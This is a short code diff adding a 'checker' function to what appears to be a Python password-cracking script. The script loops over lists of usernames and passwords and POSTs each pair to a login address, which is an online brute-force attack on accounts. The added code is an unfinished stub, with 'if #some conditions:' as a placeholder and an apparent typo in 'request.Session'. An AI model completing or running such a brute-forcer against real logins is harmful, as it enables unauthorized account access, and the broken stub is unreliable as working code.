@@ -33,3 +33,12 @@ def cracker(usernames, passwords):
                     print("found password for "+user+" ==> "+psswd)
                     usernames.remove(user)
     print("Exhausted the list of passwords")
+
+def checker(user, psswd):
+    payloads = {"user":user, "pwd":psswd}
+    with request.Session() as s:
+        page = s.post(address,data=payloads)
+    if #some conditions:
+        return True
+    else:
+        return False
